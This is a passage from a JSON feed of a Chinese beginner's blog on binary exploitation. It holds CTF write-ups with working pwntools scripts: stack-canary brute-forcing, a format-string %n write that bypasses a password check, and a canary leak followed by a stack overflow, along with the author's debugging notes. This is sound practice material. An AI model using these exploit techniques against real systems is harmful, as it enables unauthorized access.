class=\"number\">30</span>,<span class=\"number\">35</span>):</span><br><span class=\"line\">        io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>)</span><br><span class=\"line\">        io.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">        io.send(<span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">104</span> +  <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i),<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">        <span class=\"comment\">#print(senddata)</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;这是第&quot;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&quot;个&quot;</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            io.recv()</span><br><span class=\"line\">            canary += <span class=\"built_in\">chr</span>(x)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is&quot;</span>+<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">finally</span>: io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>)</span><br><span class=\"line\">    io.recv</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(io.recvline())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    leak_canary()</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://blog.csdn.net/Alex_andra/article/details/105923008\">https://blog.csdn.net/Alex_andra/article/details/105923008</a></p>\n<p>Python2:”A” * 104 + chr(i)</p>\n<p>Python3:b”A”*104 +  bytes(chr(i),’utf-8’)</p>\n<p>为什么它们的输出不一样</p>\n<p>打印字符的编码类型看看?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">oot@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/ctfquanwei/REPL-master/Canary/NJCTF2017_messager<span class=\"comment\"># python2</span></span><br><span class=\"line\">Python <span class=\"number\">2.7</span><span class=\"number\">.17</span> (default, Feb <span class=\"number\">27</span> <span class=\"number\">2021</span>, <span class=\"number\">15</span>:<span class=\"number\">10</span>:<span class=\"number\">58</span>)</span><br><span class=\"line\">[GCC <span class=\"number\">7.5</span><span class=\"number\">.0</span>] on linux2</span><br><span class=\"line\"><span class=\"type\">Type</span> <span class=\"string\">&quot;help&quot;</span>, <span class=\"string\">&quot;copyright&quot;</span>, <span class=\"string\">&quot;credits&quot;</span> <span class=\"keyword\">or</span> <span class=\"string\">&quot;license&quot;</span> <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> sys,locale</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>sys.getdefaultencoding()</span><br><span class=\"line\"><span class=\"string\">&#x27;ascii&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>q</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">NameError: name <span class=\"string\">&#x27;q&#x27;</span> <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> defined</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>quit()</span><br><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/ctfquanwei/REPL-master/Canary/NJCTF2017_messager<span class=\"comment\"># python3</span></span><br><span class=\"line\">Python <span class=\"number\">3.8</span><span class=\"number\">.0</span> (default, Dec  <span class=\"number\">9</span> <span class=\"number\">2021</span>, <span class=\"number\">17</span>:<span class=\"number\">53</span>:<span class=\"number\">27</span>)</span><br><span class=\"line\">[GCC <span class=\"number\">8.4</span><span class=\"number\">.0</span>] on linux</span><br><span class=\"line\"><span class=\"type\">Type</span> <span class=\"string\">&quot;help&quot;</span>, <span class=\"string\">&quot;copyright&quot;</span>, <span class=\"string\">&quot;credits&quot;</span> <span class=\"keyword\">or</span> <span class=\"string\">&quot;license&quot;</span> <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> sys,locale</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>sys.getdefaultencoding()</span><br><span class=\"line\"><span class=\"string\">&#x27;utf-8&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>万能的chatgpt…………………………牛的</p>\n<p>让chatgpt把python2的代码修改成python3的就可以了…………</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230219114331999.png\" alt=\"image-20230219114331999\"></p>\n<p>我之前也是这么做的呀,<font color=\"red\">只是没有canary的\\x00那个值,为什么就不行呢? 果然是因为这个……</font></p>\n<p>所以问题不在于编码,而在于这个\\x00</p>\n<p>python3</p>\n<p>python可以打印数据类型,打印一下,也可以打印一下十六进制看看吧</p>\n<p>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00”‘<br>&lt;class ‘bytes’&gt;<br>success<br>this is 34</p>\n<p>不加canary也是bytes,所以和数据类型应该没关系</p>\n<p>打印字节流的十六进制</p>\n<p>………..0x410x410x410x00x21</p>\n<p>对python2来说</p>\n<p>&lt;type ‘str’&gt;<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00<br>this is34<br>“<br>success<br>this is34<br>“</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">brute_canary</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary</span><br><span class=\"line\">    canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> xrange(<span class=\"number\">30</span>,<span class=\"number\">35</span>): <span class=\"comment\"># 2 ** 8</span></span><br><span class=\"line\">        io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">b&quot;Welcome!\\n&quot;</span>)</span><br><span class=\"line\">        io.send(<span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">104</span> + canary + <span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            io.recv()</span><br><span class=\"line\">            canary += <span class=\"built_in\">chr</span>(x)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is&quot;</span>+<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">finally</span>: io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    brute_canary()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/",
            "title": "pwn入门-7-格式化字符串题目练习1",
            "date_published": "2023-02-17T03:02:28.000Z",
            "content_html": "<h1 id=\"第五空间2019-决赛-PWN5\"><a href=\"#第五空间2019-决赛-PWN5\" class=\"headerlink\" title=\"[第五空间2019 决赛]PWN5\"></a>[第五空间2019 决赛]PWN5</h1><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230217110900326.png\" alt=\"image-20230217110900326\" style=\"zoom: 25%;\">\n\n<p>第一个感觉是 利用第一个name的输入把&#x2F;dev&#x2F;urandom的值修改了,然后passwd输入这个值就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/str/pwn5<span class=\"meta\"># checksec pwn</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/str/pwn5/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     i386<span class=\"number\">-32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No <span class=\"title function_\">PIE</span> <span class=\"params\">(<span class=\"number\">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>整体的思路是,</p>\n<p>1.找到要修改的值的地址,把这个地址写入栈中</p>\n<p>2.找到这个地址在栈中的位置,需要移动多少个位置能到这里</p>\n<p>3.利用%n随便写入一个值即可</p>\n<p>4.passwd输入对应的值即可</p>\n<p>​\t\t首先,要修改的值的地址就是0x804c044,第一个问题解决.这个是因为ida在命名的时候如果没有符号表会用地址之类的命名,所以可以直接看出来..bss:0804C044 unk_804C044</p>\n<p>​\t\t它的逻辑就是从&#x2F;dev&#x2F;urandom读取一个值到这个地址</p>\n<h2 id=\"寻找写入位置\"><a href=\"#寻找写入位置\" class=\"headerlink\" title=\"寻找写入位置\"></a>寻找写入位置</h2><p>寻找地址在栈中的位置可以进行尝试,或者利用gdb调试查看</p>\n<p>pwndbg&gt; r<br>Starting program: &#x2F;home&#x2F;ubuntu&#x2F;str&#x2F;pwn5&#x2F;pwn<br>your name:aaaaaa%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x<br>Hello,aaaaaaffffd548.63.0.f7ffda9c.3.f7fd0410.1.0.1.61616161.78256161.2e78252e.252e7825</p>\n<p>可以看到,是第10个,</p>\n<p>或者利用aaaa%10$x 来一个一个尝试            数字和$的组合代表了查看第几个值</p>\n<p>your name:aaaa%10$x<br>Hello,aaaa61616161</p>\n<h2 id=\"写入具体的值\"><a href=\"#写入具体的值\" class=\"headerlink\" title=\"写入具体的值\"></a>写入具体的值</h2><p>所以可以用</p>\n<p>p32(0x804c044) + b”%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n” 将值写入,写入的值的大小是</p>\n<p>6+8+9*8 &#x3D; 86</p>\n<p>算的不对,可以在调试的时候检查一下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/wx <span class=\"number\">0x804c044</span></span><br><span class=\"line\"><span class=\"number\">0x804c044</span>:      <span class=\"number\">0x0000004c</span></span><br></pre></td></tr></table></figure>\n\n<p>0x4 &#x3D; 76</p>\n<p>6 + 4 + 8*8 &#x3D; 76  6是hello,  4是p32()  32位,四个字节</p>\n<h2 id=\"passwd输入对应的值\"><a href=\"#passwd输入对应的值\" class=\"headerlink\" title=\"passwd输入对应的值\"></a>passwd输入对应的值</h2><p>直接输入对应的数字即可 记得是biniay类型的</p>\n<p>atoi函数会把字符转化成整数,但直接输入binary的数字也可以</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;break main&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804c044</span>) + <span class=\"string\">b&quot;%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n&quot;</span></span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;passwd:&#x27;</span>,<span class=\"string\">b&#x27;76&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">去除调试信息版本,记得这里修改payload后,passwd的长度也变了,这里就只有p32的长度<span class=\"number\">4</span>了</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">25184</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804c044</span>) + <span class=\"string\">b&#x27;%10$n&#x27;</span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;name:&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;passwd:&#x27;</span>,<span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>1.虽然开了NX和canary保护,但是不用栈溢出,所以不影响.这里不溢出的一个关键点大概是 name给的大小足够大?如果给小了可能是另外的了?</p>\n<h1 id=\"hitcon-cmt-2017-pwn200\"><a href=\"#hitcon-cmt-2017-pwn200\" class=\"headerlink\" title=\"hitcon cmt 2017 pwn200\"></a>hitcon cmt 2017 pwn200</h1><p>题目给了源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">canary_protect_me</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">40</span>];</span><br><span class=\"line\">    gets(buf);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(buf);</span><br><span class=\"line\">    gets(buf);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>编译:gcc -m32 -z lazy -z nonexecstack -fstack-protector -no-pie pwn200.c -o pwn200</p>\n<p>存在栈溢出,但是有保护nx和canary, 思路大概是覆盖返回地址为canary_protect_me,覆盖谁的返回地址呢?覆盖下一个gets的?不是这个逻辑,它还没有调用,没有返回值,那就是覆盖main函数的?</p>\n<p>正确的逻辑是 泄露canary然后栈溢出覆盖返回值</p>\n<p>所以问题是canary在哪?  这两句,第一句把canary赋值给eax然后赋值给 ebp -0xc | 回头专门研究下canary</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x804859e</span> &lt;main+<span class=\"number\">29</span>&gt;    mov    eax, dword ptr gs:[<span class=\"number\">0x14</span>]</span><br><span class=\"line\"><span class=\"number\">0x80485a4</span> &lt;main+<span class=\"number\">35</span>&gt;    mov    dword ptr [ebp - <span class=\"number\">0xc</span>], eax</span><br></pre></td></tr></table></figure>\n\n\n\n<p>所以我们需要泄露 ebp - 0xc这个位置的值,然后就可以溢出,覆盖返回地址就可以了,但是调用printf的时候,ebp不会改变吗???</p>\n<p>调试一下看看,不会…为啥呢?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一开始canary的位置  <span class=\"number\">0xffffd5bc</span></span><br><span class=\"line\"><span class=\"number\">0b</span>:<span class=\"number\">002</span>c│     <span class=\"number\">0xffffd5bc</span> ◂— <span class=\"number\">0x50b7d500</span></span><br><span class=\"line\"><span class=\"number\">0</span>c:<span class=\"number\">0030</span>│     <span class=\"number\">0xffffd5c0</span> —▸ <span class=\"number\">0xffffd5e0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0</span>d:<span class=\"number\">0034</span>│     <span class=\"number\">0xffffd5c4</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0</span>e:<span class=\"number\">0038</span>│ ebp <span class=\"number\">0xffffd5c8</span> ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n<p>和esp差了15个?</p>\n<p>payload1  %15$x</p>\n<p>然后栈溢出覆盖返回地址为canary_protect_me的            0x8048556 (p canary_protect_me 打印即可) 0x80491a2</p>\n<p>payload2 40*’a’ + canary + 12 * ‘b’ + p32(0x8048556)</p>\n<p>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccccccccccddddeeeeeeeeeeeeeeee</p>\n<p>这里有一个细节点,就是怎么正确接收canary,然后拼接上</p>\n<p>是地址对其的问题吗?? 一直不成功</p>\n<p>但是为什么用官方给的文件就可以??     <a href=\"https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61\">https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61</a></p>\n<p>  是编译器的问题吗…调试一下看看</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(&#x27;bamboofox.cs.nctu.edu.tw&#x27;,22002)</span></span><br><span class=\"line\">r = process(<span class=\"string\">&quot;./binary_200&quot;</span>)</span><br><span class=\"line\">func = <span class=\"number\">0x0804854d</span></span><br><span class=\"line\">r.sendline(<span class=\"string\">&#x27;%15$x&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(r.recv(), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;A&#x27;</span>*<span class=\"number\">40</span> + p32(canary) + <span class=\"string\">b&#x27;B&#x27;</span>*<span class=\"number\">12</span> + p32(func)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>这边联动pwntools调试也有问题…研究一下</p>\n<p>正确的应该是这样</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218143500025.png\" alt=\"image-20230218143500025\"></p>\n<p>不行的exp和这个感觉没啥区别,但是最后报错了&lt;Could not read memory at 0x4242423e&gt;</p>\n<p>返回地址那里的问题感觉是</p>\n<p>这个是有问题的,</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144242002.png\" alt=\"image-20230218144242002\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144611364.png\" alt=\"image-20230218144611364\"></p>\n<p>这个是正常的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144322352.png\" alt=\"image-20230218144322352\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144344172.png\" alt=\"image-20230218144344172\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144519430.png\" alt=\"image-20230218144519430\"></p>\n<p>文件已保存…后面可以再检查下……</p>\n<h1 id=\"hitcon-cmt-2017-pwn300\"><a href=\"#hitcon-cmt-2017-pwn300\" class=\"headerlink\" title=\"hitcon cmt 2017 pwn300\"></a>hitcon cmt 2017 pwn300</h1><p><a href=\"https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62\">https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/",
            "title": "pwn入门-6-常见工具使用入门",
            "date_published": "2023-01-24T10:13:28.000Z",
            "content_html": "<p>寒假一回来,一段时间没用,有点手生了,觉得还是需要写一篇博客来梳理一下常见工具的使用.</p>\n<p>主要是静态分析、动态分析、脚本编写、小工具</p>\n<h1 id=\"静态分析-IDA-pro\"><a href=\"#静态分析-IDA-pro\" class=\"headerlink\" title=\"静态分析:IDA pro\"></a>静态分析:IDA pro</h1><h2 id=\"ida-里面很多奇怪的东西\"><a href=\"#ida-里面很多奇怪的东西\" class=\"headerlink\" title=\"ida 里面很多奇怪的东西\"></a>ida 里面很多奇怪的东西</h2><p>dword ptr</p>\n<p>qword ptr</p>\n<p>ida的数据类型:<a href=\"https://blog.csdn.net/m0_43406494/article/details/109110983\">https://blog.csdn.net/m0_43406494/article/details/109110983</a></p>\n<h2 id=\"图形模式\"><a href=\"#图形模式\" class=\"headerlink\" title=\"图形模式\"></a>图形模式</h2><p>设置一下这俩,行号和显示数据内容</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230303204724726.png\" alt=\"image-20230303204724726\"></p>\n<h3 id=\"箭头\"><a href=\"#箭头\" class=\"headerlink\" title=\"箭头\"></a>箭头</h3><p>红色: 条件跳转没有被采用</p>\n<p>绿色: 条件跳转被采用</p>\n<p>蓝色: 无条件跳转被采用</p>\n<p>方向向上表示循环</p>\n<h2 id=\"文本模式\"><a href=\"#文本模式\" class=\"headerlink\" title=\"文本模式\"></a>文本模式</h2><p><img 